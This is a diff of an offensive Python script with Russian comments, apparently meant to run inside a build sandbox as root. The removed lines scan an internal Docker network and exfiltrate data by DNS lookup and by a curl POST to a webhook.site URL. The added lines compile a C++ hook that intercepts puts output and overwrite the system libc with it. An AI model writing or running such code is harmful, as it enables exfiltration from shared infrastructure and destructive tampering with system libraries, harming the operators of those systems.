@@ -1,55 +1,62 @@
-import socket
-import subprocess
 import os
-import json
+import subprocess
 
-# Конфигурация
-TARGET_NET = "172.17.0." # Стандартная сеть Docker, которую мы видели в логах
-WEBHOOK_URL = "https://webhook.site/6d6434ac-bcd7-48a4-901c-53ca63be0ec2"
+# Путь к хуку (твоя злая библиотека)
+EVIL_LIB_SOURCE = r"""
+#include <stdio.h>
+#include <unistd.h>
+#include <fcntl.h>
 
-def trigger_internal_alerts():
-    results = {"alerts_triggered": []}
+// Подменяем стандартный puts
+extern "C" int puts(const char *str) {
+    // Скрытно пишем в лог, что мы перехватили вывод
+    int fd = open("/tmp/pwned_libc.txt", O_WRONLY | O_CREAT | O_APPEND, 0666);
+    write(fd, "Intercepted: ", 13);
+    write(fd, str, 32); // Пишем кусок строки
+    write(fd, "\n", 1);
+    close(fd);
 
-    # 1. Агрессивное сканирование внутренней сети (триггерит IDS)
-    print("[!] Starting noisy network scan...")
-    for i in range(1, 15):
-        ip = f"{TARGET_NET}{i}"
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(0.1)
-        if s.connect_ex((ip, 80)) == 0:
-            results["alerts_triggered"].append(f"Found internal HTTP: {ip}")
-        s.close()
+    // Вызываем настоящий вывод (упрощенно)
+    return printf("%s\n", str);
+}
+"""
 
-    # 2. Попытка ptrace (инъекция в память)
-    # Даже если ptrace запрещен, попытка системного вызова логируется ядром
-    print("[!] Testing process ptrace capabilities...")
+def overwrite_system_libs():
+    print("[!] Attempting System Library Hijack...")
+    
+    # 1. Находим, где лежит libc
     try:
-        # Пытаемся "прикрепиться" к самому себе как тест на привилегии
-        res = subprocess.run(["strace", "-p", str(os.getpid())], capture_output=True, timeout=1)
-        results["ptrace_status"] = "PROBABLE_VULNERABILITY"
-    except subprocess.TimeoutExpired:
-        results["ptrace_status"] = "PTRACE_BLOCKED_BY_KERNEL"
-    except Exception as e:
-        results["ptrace_status"] = f"PTRACE_ERROR: {str(e)}"
-
-    # 3. DNS Exfiltration (триггерит аномалии трафика)
-    # Кодируем секреты в поддомены
-    print("[!] Sending DNS noise...")
-    secret_data = "ROOT_UID_0_CLEVER_SPIRIT" # Данные из твоего проекта
-    try:
-        subprocess.run(["nslookup", f"{secret_data}.vulnerability-test.railway.app"], capture_output=True)
+        libc_path = subprocess.check_output("ldd /bin/ls | grep libc.so.6 | awk '{print $3}'", shell=True).decode().strip()
+        print(f"[+] Found libc at: {libc_path}")
     except:
-        pass
+        print("[-] Could not find libc path.")
+        return
 
-    # 4. Финальный деструктивный (но безопасный) отчет
-    final_report = {
-        "status": "ATTACK_EMULATION_COMPLETE",
-        "hostname": os.uname().nodename, # Наш buildkitsandbox
-        "uid": os.getuid(), # Подтвержденный root
-        "findings": results
-    }
+    # 2. Компилируем наш хук
+    with open("/tmp/evil_hook.cpp", "w") as f:
+        f.write(EVIL_LIB_SOURCE)
+    
+    try:
+        subprocess.run(["g++", "-fPIC", "-shared", "-o", "/tmp/evil_hook.so", "/tmp/evil_hook.cpp"], check=True)
+        print("[+] Compiled evil hook.")
+    except:
+        print("[-] Compilation failed.")
+        return
 
-    subprocess.run(['curl', '-s', '-X', 'POST', '-d', json.dumps(final_report), WEBHOOK_URL])
+    # 3. Самый опасный момент: Перезапись или подмена через символическую ссылку
+    # В контейнерах часто libc — это симлинк. Мы можем его перенаправить.
+    try:
+        # Пробуем создать бэкап (если root позволит)
+        os.rename(libc_path, libc_path + ".bak")
+        # Ставим свою библиотеку на место системной
+        subprocess.run(["cp", "/tmp/evil_hook.so", libc_path], check=True)
+        print(f"[CRITICAL] {libc_path} HAS BEEN OVERWRITTEN.")
+    except Exception as e:
+        print(f"[-] Overwrite failed: {e}. (Likely Read-only FS or Busy file)")
+
+    # 4. Проверка: запуск любой команды
+    print("[!] Testing hijack with 'ls'...")
+    subprocess.run(["ls", "/"])
 
 if __name__ == "__main__":
-    trigger_internal_alerts()
+    overwrite_system_libs()
